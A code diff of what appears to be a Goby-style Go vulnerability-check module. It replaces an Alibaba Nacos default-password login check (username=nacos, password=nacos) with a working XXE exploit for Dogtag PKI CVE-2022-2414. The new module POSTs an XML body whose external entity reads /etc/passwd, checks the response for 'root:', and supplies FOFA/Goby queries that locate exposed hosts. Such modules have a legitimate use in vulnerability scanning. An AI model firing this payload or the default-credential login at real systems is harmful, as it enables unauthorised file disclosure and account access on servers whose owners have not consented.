@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "Dogtag PKI XML实体注入漏洞 CVE-2022-2414",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
-  "Level": "3",
+  "FofaQuery": "title=\"Identity Management\" ",
+  "GobyQuery": "title=\"Identity Management\" ",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,16 +30,13 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "uri": "/ca/rest/certrequests",
         "follow_redirect": true,
         "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type": "application/xml"
         },
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n</CertEnrollmentRequest>"
       },
       "ResponseTest": {
         "type": "group",
@@ -49,14 +46,14 @@ func init() {
             "type": "item",
             "variable": "$code",
             "operation": "==",
-            "value": "200",
+            "value": "400",
             "bz": ""
           },
           {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -112,8 +109,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "Dogtag PKI XML实体注入漏洞 CVE-2022-2414",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "Dogtag PKI XML injection CVE-2022-2414",
       "Product": "",
       "Description": "",
       "Recommendation": "",
